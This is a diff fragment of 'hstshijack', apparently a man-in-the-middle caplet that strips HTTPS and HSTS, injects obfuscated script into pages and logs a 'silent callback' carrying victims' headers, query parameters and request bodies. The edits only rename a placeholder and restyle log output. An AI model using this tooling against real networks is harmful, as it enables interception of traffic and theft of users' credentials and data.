@@ -161,7 +161,7 @@ function configure() {
 	payload = readFile(payload_path)
 	payload = payload_container.replace("{{payload}}", payload)
 	payload = payload.replace(/\{\{session_id\}\}/g, session_id)
-	payload = payload.replace("obf_path_stop_attack", whitelist_path)
+	payload = payload.replace("obf_path_whitelist", whitelist_path)
 	payload = payload.replace("obf_path_callback", callback_path)
 	payload = payload.replace("obf_path_ssl_log", ssl_log_path)
 	payload = payload.replace( "{{variables}}", "{{variables}}\nvar " + var_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"]\n" )
@@ -303,31 +303,31 @@ function onRequest(req, res) {
 		if (req.Path == "/" + callback_path) {
 			log_info("[" + green + "hstshijack" + reset + "] Silent callback received from " + req.Client + " for " + req.Hostname)
 
-			var logStr = "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  [" + green + "hstshijack" + reset + "] " + on_grey + "CALLBACK" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_white + " " + reset + " \n"
+			var logStr = "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_grey + "CALLBACK" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_grey + " " + reset + " \n"
 
-			logStr += "  " + on_white + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_white + " " + reset + " \n"
+			logStr += "  " + on_grey + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_grey + " " + reset + " \n"
 			headers = req.Headers.split("\r\n")
 			for (var i = 0; i < headers.length; i++) {
 				if ( headers[i].split(": ").length == 2 ) {
 					params = headers[i].split(": ")
-					logStr += "  " + on_white + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n"
+					logStr += "  " + on_grey + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n"
 				} else {
-					logStr += "  " + on_white + " " + reset + "    " + yellow + headers[i] + reset + "\n"
+					logStr += "  " + on_grey + " " + reset + "    " + yellow + headers[i] + reset + "\n"
 				}
 			}
 
-			logStr += "  " + on_white + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_white + " " + reset + " \n"
+			logStr += "  " + on_grey + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_grey + " " + reset + " \n"
 			queries = req.Query.split("&")
 			for (var i = 0; i < queries.length; i++) {
 				if ( queries[i].split("=").length == 2 ) {
 					params = queries[i].split("=")
-					logStr += "  " + on_white + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + bold + decodeURIComponent(params[1]) + reset + "\n"
+					logStr += "  " + on_grey + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + bold + decodeURIComponent(params[1]) + reset + "\n"
 				} else {
-					logStr += "  " + on_white + " " + reset + "    " + yellow + queries[i] + reset + "\n"
+					logStr += "  " + on_grey + " " + reset + "    " + yellow + queries[i] + reset + "\n"
 				}
 			}
 
-			logStr += "  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "   " + bold + "Body" + reset + "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n"
+			logStr += "  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  " + bold + "Body" + reset + "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n"
 
 			console.log(logStr)
 
@@ -341,7 +341,7 @@ function onRequest(req, res) {
 		if (req.Path == "/" + whitelist_path) {
 			log_info("[" + green + "hstshijack" + reset + "] Silent, whitelisting callback received from " + req.Client + " for " + req.Hostname)
 
-			var logStr = "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  [" + green + "hstshijack" + reset + "] " + on_white + "WHITELIST" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_white + " " + reset + " \n"
+			var logStr = "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_white + "WHITELIST" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_white + " " + reset + " \n"
 
 			logStr += "  " + on_white + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_white + " " + reset + " \n"
 			headers = req.Headers.split("\n")
